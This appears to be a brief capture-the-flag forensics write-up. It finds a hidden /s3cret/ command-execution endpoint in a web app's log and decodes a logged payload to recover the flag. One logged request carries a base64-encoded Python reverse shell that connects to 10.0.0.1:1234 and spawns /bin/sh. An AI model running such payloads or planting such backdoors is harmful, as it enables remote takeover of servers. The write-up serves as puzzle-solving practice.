look at app/urls.py and see the s3cret url handler

```

*[master][Instapwn]$ cat site_thing/server.log| grep s3cret
[06/Sep/2015 22:21:50] "GET /s3cret/?lolimacmd=MSsx HTTP/1.1" 302 0
[06/Sep/2015 22:21:50] "GET /s3cret/?lolimacmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjAuMC4xIiwxMjM0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTs= HTTP/1.1" 500 58098
[06/Sep/2015 22:21:50] "GET /s3cret/?lolimacmd=KCIiLmpvaW4oW2Nocih4KSBmb3IgeCBpbiBbNzUsIDcxLCAxMjAsIDEwNCwgOTgsIDg3LCA3NCwgMTA3LCA4OSwgODMsIDY2LCAxMjIsIDgwLCA4NiwgNTcsIDEwMiwgOTcsIDg3LCA0OSwgMTE5LCA5OCwgNTEsIDc0LCA0OCwgODgsIDQ5LCA1NiwgMTExLCA3MywgMTEwLCA3OCwgMTE4LCA4OSwgNTAsIDExNiwgMTA4LCAxMDAsIDY3LCA3MywgMTEyLCA3NiwgMTEwLCA3OCwgMTE4LCA4OSwgNTAsIDExNiwgMTA4LCAxMDAsIDY3LCAxMDMsIDExMiwgNzksIDExMCwgNzcsIDExNywgODksIDEwOSwgMTA4LCAxMTcsIDkwLCA2NywgMTAzLCAxMTEsIDc0LCAxMjEsIDk5LCAxMTUsIDc3LCA4NCwgNzcsIDEyMiwgNzgsIDEyMSwgMTA3LCAxMTIsIDgwLCA4NCwgNDksIDEyMiwgNzYsIDEwOSwgMTIwLCAxMTIsIDk5LCA1MSwgODIsIDEwOCwgOTgsIDEwNSwgMTAzLCA0OSwgNzUsIDg0LCA0OCwgNTcsIDk4LCA4NywgNzAsIDExOSwgNzUsIDcxLCAxMjAsIDEwNCwgOTgsIDg3LCA3NCwgMTA3LCA4OSwgODMsIDY2LCAxMDYsIDc5LCAxMDksIDc4LCA5OCwgNzcsIDcwLCA0OCwgMTE3LCA5OSwgNTAsIDg2LCAxMTcsIDkwLCA2NywgMTA0LCAxMDYsIDg3LCAxMjIsIDY2LCAxMDAsIDc2LCAxMTAsIDc0LCAxMDgsIDg5LCA1MSwgODksIDExMSwgNzksIDg0LCAxMDcsIDExMiwgNzUsIDgzLCAxMTksIDExMSwgOTksIDEyMSwgNTMsIDEwNCwgODksIDUwLCA3OCwgMTA4LCA5OSwgNzIsIDgxLCAxMTEsIDc1LCA4NywgOTAsIDExOCwgOTksIDEwNSwgNjYsIDEwMiwgNzMsIDcxLCAxMDgsIDExNywgNzMsIDcxLCAxMDgsIDQ4LCA5MCwgODgsIDczLCAxMTEsIDk3LCA4NywgNTMsIDQ4LCA3NiwgNjgsIDY5LCAxMTIsIDc1LCA4MywgMTA3LCAxMTIsIDc1LCA2NywgMTA3LCA2MV1dKSkuZGVjb2RlKCJiYXNlNjQiKQ== HTTP/1.1" 302 0
[06/Sep/2015 22:21:50] "GET /s3cret/?lolimacmd=KGxhbWJkYSBhPSdmJyxiPSdsJyxjPSdhJyxkPSdnJyxlPSd7JyxmPSd3JyxnPSdoJyxoPSdlJyxpPSduJyxqPSdfJyxrPScxJyxsPSduJyxtPSdfJyxuPSdkJyxvPSdvJyxwPSd1JyxxPSdiJyxyPSd0JyxzPSdfJyx0PSdsJyx1PScwJyx2PScwJyx3PSdrJyx4PSdfJyx5PSdAJyx6PSdfJyxhYT0ndCcsYWI9J2gnLGFjPSdlJyxhZD0nXycsYWU9J2wnLGFmPScwJyxhZz0nZycsYWg9J3MnLGFpPSd9JzogImxvbCIpKCk= HTTP/1.1" 302 0


```

```
*[master][Instapwn]$ python -c 'print "KGxhbWJkYSBhPSdmJyxiPSdsJyxjPSdhJyxkPSdnJyxlPSd7JyxmPSd3JyxnPSdoJyxoPSdlJyxpPSduJyxqPSdfJyxrPScxJyxsPSduJyxtPSdfJyxuPSdkJyxvPSdvJyxwPSd1JyxxPSdiJyxyPSd0JyxzPSdfJyx0PSdsJyx1PScwJyx2PScwJyx3PSdrJyx4PSdfJyx5PSdAJyx6PSdfJyxhYT0ndCcsYWI9J2gnLGFjPSdlJyxhZD0nXycsYWU9J2wnLGFmPScwJyxhZz0nZycsYWg9J3MnLGvbCIpKCk==".decode("base64")'
(lambda a='f',b='l',c='a',d='g',e='{',f='w',g='h',h='e',i='n',j='_',k='1',l='n',m='_',n='d',o='o',p='u',q='b',r='t',s='_',t='l',u='0',v='0',w='k',x='_',y='@',z='_',aa='t',ab='h',ac='e',ad='_',ae='l',af='0',ag='g',ah='s',ai='}')()
```

